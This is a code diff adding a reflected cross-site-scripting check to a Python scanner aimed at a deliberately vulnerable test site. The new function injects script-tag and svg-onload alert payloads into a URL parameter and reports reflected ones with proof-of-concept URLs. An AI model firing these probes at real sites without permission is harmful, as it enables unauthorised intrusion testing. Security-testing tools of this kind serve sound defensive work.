@@ -1,6 +1,7 @@
 #   Usage: python3 XSS_scanner.py http://testphp.vulnweb.com/
 
 import requests
+from termcolor import colored
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from pprint import pprint
@@ -62,6 +63,46 @@ def scan_xss(url):
             is_vulnerable = True
     return is_vulnerable
 
+
+def xss(url):
+    paydone = []
+    payloads = ['injectest','/inject','//inject//','<inject','(inject','"inject','<script>alert("inject")</script>']
+    print(colored("Performing Blind XSS Checks","green"))
+    urlt = url.split("=")
+    urlt = urlt[0] + '='
+    for pl in payloads:
+        urlte = urlt + pl
+        re = requests.get(urlte).text
+        if pl in re:
+            paydone.append(pl)
+        else:
+            pass
+    url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
+    req1 = requests.get(url1).text
+    if "'>inject<svg/onload=confirm(/inject/)>web" in req1:
+        paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
+    else:
+        pass
+    url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
+    req2 = requests.get(url2).text
+    if '<script>alert("inject")</script>' in req2:
+        paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
+    else:
+        pass
+    url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
+    req3 = requests.get(url3).text
+    if '<script>alert("inject")</script>' in req3:
+        paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
+    else:
+        pass
+    if len(paydone) == 0:
+        print("No XSS Vulnerability Identified")
+    else:
+        print("\t",len(paydone),"Payloads were found.")
+        for p in paydone:
+            print("\tPayload found!")
+            print("\tPayload:",p)
+            print("\tPOC:",urlt+p)
 
  
 #url = sys.argv[1]
